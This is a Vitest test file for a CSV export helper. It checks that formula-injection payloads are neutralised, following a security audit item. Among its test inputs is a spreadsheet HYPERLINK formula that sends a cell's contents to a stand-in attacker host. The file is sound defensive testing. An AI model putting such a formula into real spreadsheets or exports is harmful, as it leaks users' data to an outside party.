/**
 * S5 (2026-09-14 security audit, item 3) — CSV formula injection.
 */

import { describe, it, expect } from 'vitest'
import { escapeField, buildCsv } from '../csv-export'

describe('escapeField', () => {
  it('leaves ordinary text alone', () => {
    expect(escapeField('Alice Brown')).toBe('Alice Brown')
    expect(escapeField(42)).toBe('42')
    expect(escapeField(null)).toBe('')
    expect(escapeField(undefined)).toBe('')
  })

  it('still quotes and doubles on comma, quote and newline', () => {
    expect(escapeField('Brown, Alice')).toBe('"Brown, Alice"')
    expect(escapeField('she said "hi"')).toBe('"she said ""hi"""')
    expect(escapeField('line one\nline two')).toBe('"line one\nline two"')
  })

  it.each([
    ['=HYPERLINK("https://evil.example/?d="&A1,"click")'],
    ['+1+1'],
    ['-2+3'],
    ['@SUM(A1:A9)'],
    ['\t=1+1'],
    ['\r=1+1'],
  ])('neutralises a formula lead: %s', (payload) => {
    const out = escapeField(payload)
    expect(out.startsWith(`"'`)).toBe(true)
    expect(out.endsWith('"')).toBe(true)
    // The apostrophe must sit inside the quotes, not before them.
    expect(out.startsWith(`'`)).toBe(false)
  })

  it('keeps the inner quote doubling when it also neutralises', () => {
    expect(escapeField('=A1&"x"')).toBe(`"'=A1&""x"""`)
  })

  it('does not neutralise a minus sign that is not leading', () => {
    expect(escapeField('Anne-Marie')).toBe('Anne-Marie')
  })
})

describe('buildCsv', () => {
  it('neutralises in headers and body alike', () => {
    const csv = buildCsv(
      [
        { key: 'name', label: '=name' },
        { key: 'note', label: 'Note' },
      ],
      [{ name: '@evil', note: 'plain' }],
    )
    expect(csv).toBe(`"'=name",Note\n"'@evil",plain`)
  })
})
